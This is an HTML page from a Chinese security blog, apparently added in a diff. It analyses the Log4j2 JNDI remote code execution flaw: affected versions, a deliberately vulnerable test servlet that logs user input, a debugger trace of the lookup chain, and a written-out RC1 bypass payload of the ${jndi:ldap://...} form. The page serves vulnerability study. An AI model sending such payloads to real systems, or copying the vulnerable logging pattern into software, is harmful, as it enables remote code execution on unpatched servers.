@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    
+    <title>Log4j2-RCE - S0cke3t&#39;s Blog</title>
+    <meta charset="UTF-8">
+    <meta name="description" content="">
+    <meta name="keywords" content="渗透测试,CISP-PTE,代码审计,破解,移动安全,安全工具,漏洞利用">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="Log4j2 RCE 漏洞分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j2-RCE">
+<meta property="og:url" content="https://www.saferoad.cc/Analysis/Log4j2-RCE.html">
+<meta property="og:site_name" content="S0cke3t&#39;s Blog">
+<meta property="og:description" content="Log4j2 RCE 漏洞分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281306369.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307743.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307538.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307857.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307438.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307797.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307213.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307753.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307072.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307649.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281308609.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281308644.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281308295.png">
+<meta property="article:published_time" content="2021-12-13T04:55:43.000Z">
+<meta property="article:modified_time" content="2022-03-28T11:34:47.759Z">
+<meta property="article:author" content="S0cke3t">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281306369.png">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
+    <link rel="stylesheet" href="/css/style.css?v=1681132088677">
+     
+    
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1681132088677">
+    
+<meta name="generator" content="Hexo 6.1.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="mdui-drawer-body-left">
+    
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/newbolg/202203272236776.jpg)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="S0cke3t" class="mdui-btn mdui-btn-icon"><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/202203272159225.jpg" alt="S0cke3t"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        
+<meta name="keywords" content="渗透测试,CISP-PTE,代码审计,破解,移动安全,安全工具,漏洞利用">
+
+<div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="S0cke3t">
+            <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/202203272159225.jpg" alt="S0cke3t" alt="S0cke3t">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>40</div>
+        <div><span>标签</span>28</div>
+        <div><span>分类</span>12</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/aboutme.html" title="关于我">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于我
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:saferoad.cc" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/DeEpinGh0st/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+    
+    
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Analysis/">Analysis</a>
+          <span class="category-list-count">11</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Android/">Android</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Audit/">Audit</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Bypass/">Bypass</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CISP-PTE/">CISP-PTE</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Case-share/">Case share</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Crack/">Crack</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Deserialization/">Deserialization</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Docker/">Docker</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Emergency/">Emergency</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Notes/">Notes</a>
+          <span class="category-list-count">6</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Sectool/">Sectool</a>
+          <span class="category-list-count">10</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+    
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/ASP-NET/" style="font-size: 12.5px;">ASP.NET</a> <a href="/tags/Bypass/" style="font-size: 15px;">Bypass</a> <a href="/tags/Csharp/" style="font-size: 17.5px;">Csharp</a> <a href="/tags/Django/" style="font-size: 10px;">Django</a> <a href="/tags/Domain-security/" style="font-size: 10px;">Domain security</a> <a href="/tags/Flink/" style="font-size: 10px;">Flink</a> <a href="/tags/Frida/" style="font-size: 10px;">Frida</a> <a href="/tags/Hook/" style="font-size: 10px;">Hook</a> <a href="/tags/Java/" style="font-size: 20px;">Java</a> <a href="/tags/KeyGen/" style="font-size: 10px;">KeyGen</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Nim/" style="font-size: 10px;">Nim</a> <a href="/tags/PHP/" style="font-size: 12.5px;">PHP</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Portainer/" style="font-size: 10px;">Portainer</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/Reappearance/" style="font-size: 10px;">Reappearance</a> <a href="/tags/SecTool/" style="font-size: 10px;">SecTool</a> <a href="/tags/Seeyon/" style="font-size: 10px;">Seeyon</a> <a href="/tags/Spring/" style="font-size: 15px;">Spring</a> <a href="/tags/Sqlmap/" style="font-size: 10px;">Sqlmap</a> <a href="/tags/Struts2/" style="font-size: 10px;">Struts2</a> <a href="/tags/ThinkPHP/" style="font-size: 10px;">ThinkPHP</a> <a href="/tags/Windows/" style="font-size: 12.5px;">Windows</a> <a href="/tags/WordPress/" style="font-size: 10px;">WordPress</a> <a href="/tags/cuckoo/" style="font-size: 10px;">cuckoo</a> <a href="/tags/sandbox/" style="font-size: 10px;">sandbox</a> <a href="/tags/solution/" style="font-size: 10px;">solution</a>
+    </div>
+    
+  </div>
+
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 S0cke3t
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br/>Too Young Too Sample
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+      
+          <div class="nexmoe-post-cover" style="padding-bottom: NaN%;"> 
+              <img data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/newbolg/202203272236776.jpg" data-sizes="auto" alt="Log4j2-RCE" class="lazyload">
+              <h1>Log4j2-RCE</h1>
+          </div>
+      
+      
+      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年12月13日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.3k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
+</div>
+
+      
+
+      <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近Log4j2的RCE漏洞可谓是刷爆了整个安全圈,也是被国内外安全圈的大佬们玩出了花。在发布漏洞后笔者也是根据官方commit对此次漏洞进行了调试分析,But….周末杂七杂八的事实在太多一直没来得及记录。今天发出来也算是蹭一下最后的余温….</p>
+<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p><code>Apache Log4j2</code>是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。<br>由于<code>Apache Log4j2 lookup</code>功能存在递归解析功能，攻击者可直接构造恶意请求，⽆需进⾏特殊配置，即可触发远程代码执⾏。</p>
+<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>Java类产品：<code>Apache Log4j 2.x &lt; 2.15.0-rc2</code><br>受影响的应用及组件（包括但不限于）如下：<br><code>Apache Solr、Apache Flink、Apache Druid、Apache Struts2、srping-boot-strater-log4j2</code>等。</p>
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>IDEA新建Maven项目，并导入如下依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre class="line-numbers language-hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name"><code class="language-hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>></span><br><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></td></tr></table></figure>
+<p> 新建<code>Selvlet</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre class="line-numbers language-hljs java"><span class="hljs-meta">@WebServlet(name = &quot;ServletDemo&quot;, value = &quot;/ServletDemo&quot;)</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;  <br>  <span class="hljs-meta">@Override</span>  <br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        doPost(request,response);  <br>    &#125;  <br>  <br>  <span class="hljs-meta">@Override</span>  <br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(ServletDemo.class.getName());  <br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> response.getWriter();  <br>        printWriter.println(<span class="hljs-string">&quot;Log4j2 JNDI injection&quot;</span>);  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span>  <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;msg&quot;</span>);  <br>        <span class="hljs-keyword">if</span> (payload == <span class="hljs-literal">null</span>)&#123;  <br>            payload = <span class="hljs-string">&quot;input msg parameter: ?msg=helloworld&quot;</span>;  <br>        &#125;  <br>        printWriter.println(<span class="hljs-string"><code class="language-hljs java"><span class="hljs-meta">@WebServlet(name = &quot;ServletDemo&quot;, value = &quot;/ServletDemo&quot;)</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;  <br>  <span class="hljs-meta">@Override</span>  <br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        doPost(request,response);  <br>    &#125;  <br>  <br>  <span class="hljs-meta">@Override</span>  <br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(ServletDemo.class.getName());  <br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> response.getWriter();  <br>        printWriter.println(<span class="hljs-string">&quot;Log4j2 JNDI injection&quot;</span>);  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span>  <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;msg&quot;</span>);  <br>        <span class="hljs-keyword">if</span> (payload == <span class="hljs-literal">null</span>)&#123;  <br>            payload = <span class="hljs-string">&quot;input msg parameter: ?msg=helloworld&quot;</span>;  <br>        &#125;  <br>        printWriter.println(<span class="hljs-string">"execute paylaod: "</span> + payload);  <br>        logger.error(payload);  <br>        printWriter.flush();  <br>        printWriter.close();  <br>    }  <br>}<br><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></td></tr></table></figure>
+
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>首先使用互联网上公开的漏洞触发语句进行调试分析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class="line-numbers language-hljs java"><span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator"><code class="language-hljs java"><span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(xxxx.class.getName());<br>logger.error(payload);<br><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></td></tr></table></figure>
+
+<p> 进入到error函数后首先会调用<code>logIfEnabled</code>,在该函数中首先会调用<code>isEnabled</code>判断是否要进行日志记录(具体细节后面会讲)。如果满足一定条件则调用<code>logMessage</code>进行下一步操作。<br> <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281306369.png"><br> 在经过一系列操作后我们来到<code>org.apache.logging.log4j.core.pattern!format</code><br> <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307743.png"><br> 在format函数中会匹配<code>$&#123;</code>，当匹配到<code>$&#123;</code>内容后并将其中内容取出调用<code>substitube</code>进行下一步操作<br> <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307538.png"><br> 跟进<code>substitube</code><br> <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307857.png"><br> 省略一些判断后<code>substitube</code>会调用<code>resolveVariable</code>，继续跟进<br> <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307438.png"><br> <code>resolveVariable</code>首先会调用<code>getVariableResolver</code>获取可用的resolver,随后调用lookup函数<br> <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307797.png"><br> lookup首先根据<code>:</code>的索引获取到传入的协议类型，随后调用<code>this.strLookupMap.get</code>获取一个lookup实例。随后调用lookup实例的lookup，跟进<br> <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307213.png"><br> <code>Jndilookup</code>首先调用<code>JndiManager.getDefaultManager();</code>获取<code>jndi context</code>,随后调用<code>jndimanager.lookup</code>完成最终的jndi注入<br> <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307753.png"><br> 在调试完整个流程后，我们不禁会思考这样一个问题，既然在默认配置下<code>logger.error()</code>可以触发jndi注入那么像<code>logger.info(),logger.warn(),logger.all()</code>等其他函数是否也能触发jndi注入。<br> 首先我们把先前的代码稍作修改<br> <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307072.png"><br> 在默认配置下，我们分别调用<code>error,warn,info</code>三个函数，并修改dnslog域名前缀。这样我们就知道dnslog是由哪个函数发出的<br> <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281307649.png"><br> 在发出请求后，dnslog只收到了来自error函数的记录。而其他的<code>warn,info</code>并没有像我们预期的那样触发jndi注入<br>出现该问题的关键就在于我们之前提到的<code>isEnable</code>函数。<br>在<code>isEnable</code>中调用了<code>this.privateConfig.filter</code>，我们看看在filter中具体做了什么<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281308609.png"><br>filter首先调用<code>this.config.getfilter</code>获取配置信息，如果没有获取到配置信息，则对<code>this.intLevel</code>和<code>level.intLevel</code>进行比较，只有当<code>this.intLevel</code> 大于或等于<code>level.intLevel</code>才会进行下一步的日志记录操作<br> 而log4j2默认过滤级别为<code>error</code>，所以当我们传入过滤级别高于默认过滤级别时不会触发jndi注入。<br> 当我们手动为log4j2指定一个过滤级别<br> <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281308644.png"><br> 再次发送请求后，可以成功触发dnslog请求<br> <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/12/13/202203281308295.png">  </p>
+<h4 id="RC1-绕过"><a href="#RC1-绕过" class="headerlink" title="RC1 绕过"></a>RC1 绕过</h4><p>在发布该漏洞后，apache官方紧急发布了RC1修复版本，但RC1由于修复不完善导致可进行绕过<br> 如果要在RC1下利用此漏洞，需要用户在打开lookup功能下才能进行JNDI注入。<br>Payload  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class="line-numbers language-hljs plaintext"><code class="language-hljs plaintext">${jndi:ldap://127.0.0.1:1389/ Badclassname}<br>注意Badclassname前的空格<br><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></td></tr></table></figure>
+<p>篇幅有限，具体绕过分析可参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10649">Apache Log4j2从RCE到RC1绕过</a></p>
+
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>S0cke3t<br>
+        <strong>本文链接：</strong><a href="https://www.saferoad.cc/Analysis/Log4j2-RCE.html" title="https:&#x2F;&#x2F;www.saferoad.cc&#x2F;Analysis&#x2F;Log4j2-RCE.html" target="_blank" rel="noopener">https:&#x2F;&#x2F;www.saferoad.cc&#x2F;Analysis&#x2F;Log4j2-RCE.html</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+    
+        <a class="nexmoefont icon-appstore-fill -link" href="/categories/Analysis/">Analysis</a>
+    
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/Java/" rel="tag">Java</a>
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">3.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">4.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RC1-%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">RC1 绕过</span></a></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="回到顶部" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+     
+    <div id="nexmoe-search-space">
+        <div class="search-container">
+            <div class="search-header">
+                <div class="search-input-container">
+                    <input class="search-input" type="text" placeholder="搜索" oninput="sinput();">
+                </div>
+                <a class="search-close" onclick="sclose();">×</a>
+            </div>
+            <div class="search-body"></div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+ 
+
+<script async src="/js/app.js?v=1681132088680"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
+<script>
+	$(".justified-gallery").justifiedGallery({
+		rowHeight: 160,
+		margins: 10,
+	});
+</script>
+
+
+    
+
+
+
+
+
+</body>
+
+</html>
